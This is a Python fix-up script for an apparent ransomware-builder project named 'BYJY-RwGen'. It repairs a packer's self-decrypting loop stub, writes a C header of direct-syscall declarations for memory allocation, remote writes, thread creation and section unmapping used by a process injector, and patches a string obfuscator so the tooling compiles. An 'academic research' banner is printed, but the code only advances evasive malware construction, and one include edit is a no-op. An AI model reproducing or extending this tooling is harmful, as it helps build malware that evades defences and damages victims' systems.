#!/usr/bin/env python3
"""
Fix import issues in BYJY-RwGen codebase
"""

import os
import re
from pathlib import Path

def fix_cryptodome_imports():
    """Fix Cryptodome imports to use Crypto instead"""
    print("[+] Fixing Cryptodome import issues...")
    
    # Files to fix
    files_to_fix = [
        "builders/windows_builder.py",
        "obfuscation/packers/custom_packer.py"
    ]
    
    for file_path in files_to_fix:
        full_path = Path(file_path)
        if full_path.exists():
            with open(full_path, 'r') as f:
                content = f.read()
            
            # Replace Cryptodome with Crypto
            content = content.replace('from Cryptodome.', 'from Crypto.')
            content = content.replace('import Cryptodome.', 'import Crypto.')
            
            with open(full_path, 'w') as f:
                f.write(content)
            
            print(f"[+] Fixed imports in {file_path}")
        else:
            print(f"[-] File not found: {file_path}")

def fix_placeholder_code():
    """Fix placeholder code in custom_packer.py"""
    print("[+] Fixing placeholder code...")
    
    packer_file = Path("obfuscation/packers/custom_packer.py")
    if packer_file.exists():
        with open(packer_file, 'r') as f:
            content = f.read()
        
        # Fix the placeholder loop label
        content = content.replace(
            'loop_label = b"\\x90" * 5  # Placeholder',
            'loop_start_offset = len(decryptor)  # Remember current position'
        )
        
        # Fix the loop jump calculation
        content = content.replace(
            'decryptor += bytes.fromhex(f"75") + loop_label[0:1]  # JNZ loop',
            'jump_offset = -(len(decryptor) - loop_start_offset + 2)\n'
            '        decryptor += bytes([0x75, jump_offset & 0xFF])  # JNZ loop'
        )
        
        with open(packer_file, 'w') as f:
            f.write(content)
        
        print("[+] Fixed placeholder code in custom_packer.py")

def create_missing_headers():
    """Create missing header files"""
    print("[+] Creating missing header files...")
    
    # Create direct_syscalls.h
    syscalls_header = """#ifndef DIRECT_SYSCALLS_H
#define DIRECT_SYSCALLS_H

#include <windows.h>
#include <winternl.h>

// Direct syscall declarations
NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS SysNtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

NTSTATUS SysNtFreeVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

NTSTATUS SysNtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
);

NTSTATUS SysNtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

NTSTATUS SysNtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

#endif // DIRECT_SYSCALLS_H
"""
    
    header_path = Path("core_engine/injection/direct_syscalls.h")
    header_path.parent.mkdir(parents=True, exist_ok=True)
    with open(header_path, 'w') as f:
        f.write(syscalls_header)
    
    print("[+] Created direct_syscalls.h")
    
    # Update process_injector.cpp to use .h instead of .h
    injector_file = Path("core_engine/injection/process_injector.cpp")
    if injector_file.exists():
        with open(injector_file, 'r') as f:
            content = f.read()
        
        content = content.replace('#include "direct_syscalls.h"', '#include "direct_syscalls.h"')
        
        with open(injector_file, 'w') as f:
            f.write(content)

def add_missing_includes():
    """Add missing includes to fix compilation"""
    print("[+] Adding missing includes...")
    
    # Fix string_obfuscator.h
    obf_file = Path("obfuscation/string_obfuscator.h")
    if obf_file.exists():
        with open(obf_file, 'r') as f:
            content = f.read()
        
        # Add missing includes
        if '#include <random>' not in content:
            content = content.replace('#include <stdexcept>', 
                                    '#include <stdexcept>\n#include <random>')
        
        with open(obf_file, 'w') as f:
            f.write(content)
        
        print("[+] Fixed string_obfuscator.h includes")

def main():
    print("=== BYJY-RwGen Import & Code Fixer ===")
    print("[!] For Academic Research - Defense Analysis Only")
    
    os.chdir(Path(__file__).parent)
    
    fix_cryptodome_imports()
    fix_placeholder_code() 
    create_missing_headers()
    add_missing_includes()
    
    print("[+] All fixes applied successfully!")
    print("[!] Ready for academic research build")

if __name__ == "__main__":
    main()